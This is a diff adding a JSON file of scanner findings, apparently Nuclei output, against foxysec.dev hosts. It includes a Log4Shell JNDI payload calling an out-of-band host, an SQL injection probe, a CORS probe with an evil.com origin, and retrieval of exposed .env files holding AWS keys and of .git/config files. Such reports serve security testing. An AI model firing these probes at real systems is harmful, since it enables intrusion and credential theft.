@@ -1,0 +1,113 @@
+[
+  {
+    "template-id": "cve-2021-44228",
+    "info": {
+      "name": "Apache Log4j2 - Remote Code Execution",
+      "severity": "critical",
+      "tags": ["cve", "cve2021", "rce", "oast", "log4j"]
+    },
+    "type": "http",
+    "host": "payment.foxysec.dev",
+    "matched-at": "https://payment.foxysec.dev/api/v1/checkout",
+    "timestamp": "2026-03-19T19:30:00.000Z",
+    "curl-command": "curl -X POST -H 'X-Api-Version: ${jndi:ldap://redfalcon.oast.me/a}' https://payment.foxysec.dev/api/v1/checkout",
+    "extracted-results": ["DNS OAST Interaction Received: redfalcon.oast.me"]
+  },
+  {
+    "template-id": "aws-env-exposure",
+    "info": {
+      "name": "Exposed Environment File (.env) with AWS Keys",
+      "severity": "critical",
+      "tags": ["exposure", "config", "aws", "keys"]
+    },
+    "type": "http",
+    "host": "admin.foxysec.dev",
+    "matched-at": "https://admin.foxysec.dev/.env",
+    "timestamp": "2026-03-19T19:30:05.000Z",
+    "curl-command": "curl -s -k https://admin.foxysec.dev/.env",
+    "extracted-results": ["AKIAIOSFODNN7EXAMPLE", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]
+  },
+  {
+    "template-id": "cve-2023-46805",
+    "info": {
+      "name": "Ivanti ICS - Authentication Bypass",
+      "severity": "high",
+      "tags": ["cve", "cve2023", "auth-bypass", "ivanti"]
+    },
+    "type": "http",
+    "host": "vpn.foxysec.dev",
+    "matched-at": "https://vpn.foxysec.dev/api/v1/totp/user-verify",
+    "timestamp": "2026-03-19T19:30:10.000Z",
+    "curl-command": "curl -k -H 'Cookie: DSID=xyz' https://vpn.foxysec.dev/api/v1/totp/user-verify",
+    "extracted-results": []
+  },
+  {
+    "template-id": "sqli-error-based",
+    "info": {
+      "name": "Error Based SQL Injection",
+      "severity": "high",
+      "tags": ["sqli", "dast", "database"]
+    },
+    "type": "http",
+    "host": "shop.foxysec.dev",
+    "matched-at": "https://shop.foxysec.dev/products?id=1'",
+    "timestamp": "2026-03-19T19:30:15.000Z",
+    "curl-command": "curl -s 'https://shop.foxysec.dev/products?id=1%27'",
+    "extracted-results": ["SQL syntax error near '1'''", "MySQL server version for the right syntax"]
+  },
+  {
+    "template-id": "cors-misconfig-any-origin",
+    "info": {
+      "name": "CORS Misconfiguration - Allow Origin Wildcard",
+      "severity": "medium",
+      "tags": ["cors", "misconfig", "exposure"]
+    },
+    "type": "http",
+    "host": "api.foxysec.dev",
+    "matched-at": "https://api.foxysec.dev/users/me",
+    "timestamp": "2026-03-19T19:30:20.000Z",
+    "curl-command": "curl -H 'Origin: https://evil.com' -I https://api.foxysec.dev/users/me",
+    "extracted-results": ["Access-Control-Allow-Origin: https://evil.com", "Access-Control-Allow-Credentials: true"]
+  },
+  {
+    "template-id": "subdomain-takeover-s3",
+    "info": {
+      "name": "AWS S3 Bucket Subdomain Takeover",
+      "severity": "high",
+      "tags": ["takeover", "s3", "aws"]
+    },
+    "type": "http",
+    "host": "cdn-assets.foxysec.dev",
+    "matched-at": "http://cdn-assets.foxysec.dev",
+    "timestamp": "2026-03-19T19:30:25.000Z",
+    "curl-command": "curl -s http://cdn-assets.foxysec.dev",
+    "extracted-results": ["The specified bucket does not exist"]
+  },
+  {
+    "template-id": "git-config-exposure",
+    "info": {
+      "name": "Exposed Git Configuration File",
+      "severity": "medium",
+      "tags": ["exposure", "git", "config"]
+    },
+    "type": "http",
+    "host": "dev.foxysec.dev",
+    "matched-at": "https://dev.foxysec.dev/.git/config",
+    "timestamp": "2026-03-19T19:30:30.000Z",
+    "curl-command": "curl -s https://dev.foxysec.dev/.git/config",
+    "extracted-results": ["[core]", "repositoryformatversion = 0"]
+  },
+  {
+    "template-id": "tech-detect",
+    "info": {
+      "name": "Wappalyzer Technology Detection",
+      "severity": "info",
+      "tags": ["tech", "osint"]
+    },
+    "type": "http",
+    "host": "www.foxysec.dev",
+    "matched-at": "https://www.foxysec.dev",
+    "timestamp": "2026-03-19T19:30:35.000Z",
+    "extracted-results": ["React", "Nginx", "Tailwind CSS"]
+  }
+]
